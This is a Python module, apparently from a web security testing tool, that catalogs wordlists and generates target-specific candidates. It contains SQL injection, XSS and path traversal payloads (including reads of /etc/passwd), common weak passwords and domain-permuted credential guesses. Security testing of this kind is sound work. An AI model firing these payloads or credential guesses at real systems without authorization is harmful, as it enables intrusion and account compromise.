"""
Wordlist catalog + target-specific generation.

Curated seed lists for content discovery, plus deterministic generation of
target-specific candidate paths/params/credentials from the discovered surface.
Inspired by OLYMPUS core/wordlists.py + HEPHAESTUS. Pure and deterministic.
"""
from urllib.parse import urlparse

# ── Curated seed catalog ─────────────────────────────────────────
CATALOG = {
    "content-common": {
        "label": "Common content paths",
        "description": "High-signal directories and files for content discovery.",
        "words": [
            "admin", "administrator", "login", "logout", "dashboard", "api",
            "api/v1", "api/v2", "graphql", "swagger", "swagger-ui", "openapi.json",
            "docs", "actuator", "actuator/env", "actuator/health", "metrics",
            "server-status", "status", "health", "version", "config", ".env",
            ".git/HEAD", ".git/config", "backup", "backups", "old", "tmp",
            "uploads", "files", "private", "internal", "dev", "test", "staging",
            "robots.txt", "sitemap.xml", ".well-known/security.txt", "phpinfo.php",
            "wp-login.php", "wp-admin", "wp-json/wp/v2/users", "console", "debug",
        ],
    },
    "params-common": {
        "label": "Common parameter names",
        "description": "Parameter names to probe for injection / IDOR / hidden features.",
        "words": [
            "id", "user", "user_id", "account", "order", "invoice", "file", "path",
            "page", "url", "redirect", "next", "callback", "q", "search", "query",
            "cmd", "exec", "template", "include", "debug", "admin", "role", "token",
            "key", "secret", "email", "name", "lang", "locale", "format", "view",
        ],
    },
    "passwords-common": {
        "label": "Common passwords",
        "description": "Top weak passwords for authorized credential testing only.",
        "words": [
            "admin", "password", "password1", "123456", "12345678", "qwerty",
            "letmein", "welcome", "changeme", "root", "toor", "administrator",
            "admin123", "Password1!", "Welcome1", "P@ssw0rd", "test", "guest",
        ],
    },
    "sqli": {
        "label": "SQLi probes",
        "description": "Benign-first SQL injection markers.",
        "words": ["'", "1' ORDER BY 1-- -", "1' AND '1'='1", "1' AND SLEEP(5)-- -",
                  "1' UNION SELECT NULL-- -", "1'||(SELECT '')||'"],
    },
    "xss": {
        "label": "XSS probes",
        "description": "Reflected/DOM XSS markers.",
        "words": ["<script>alert(document.domain)</script>",
                  "\"><img src=x onerror=alert(document.domain)>",
                  "'-alert(document.domain)-'", "<svg onload=alert(document.domain)>",
                  "javascript:alert(document.domain)"],
    },
    "traversal": {
        "label": "Path traversal probes",
        "description": "Directory traversal / LFI markers.",
        "words": ["../../../../etc/passwd", "....//....//....//etc/passwd",
                  "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php",
                  "..%2f..%2f..%2fetc%2fpasswd"],
    },
}


def catalog() -> list:
    """List available seed wordlists with size + preview."""
    out = []
    for wid, entry in CATALOG.items():
        out.append({
            "id": wid,
            "label": entry["label"],
            "description": entry["description"],
            "count": len(entry["words"]),
            "preview": entry["words"][:8],
        })
    return out


def get_words(wordlist_id: str) -> list:
    entry = CATALOG.get(wordlist_id)
    return list(entry["words"]) if entry else []


# ── Target-specific generation ──────────────────────────────────
_SUFFIXES = ("", "-admin", "-api", "-dev", "-staging", "-test", "-prod", "01", "1",
             "2024", "2025", "!", "123", "123!")


def target_credentials(domain: str) -> list:
    """Domain-permuted credential candidates (authorized testing only)."""
    root = (domain or "").split(":")[0].split(".")[0].lower()
    base = {root, root.capitalize()} if root else set()
    base |= {"admin", "administrator", "root", "test", "user", "support"}
    out = []
    for b in sorted(base):
        for suf in _SUFFIXES:
            out.append(f"{b}{suf}")
    return list(dict.fromkeys(out))


def target_paths(base_url: str, discovered_urls: list = None) -> list:
    """Merge curated content words with names mined from the discovered surface."""
    from web_security import generate_discovery_words
    return generate_discovery_words(base_url, discovered_urls or [])


def payloads_for(vuln_class: str) -> list:
    """Payload set for a classified finding class (HEPHAESTUS-style forge)."""
    mapping = {
        "sqli": "sqli", "sql": "sqli",
        "xss": "xss", "reflected xss": "xss",
        "lfi": "traversal", "traversal": "traversal", "path traversal": "traversal",
    }
    key = mapping.get((vuln_class or "").lower())
    return get_words(key) if key else []
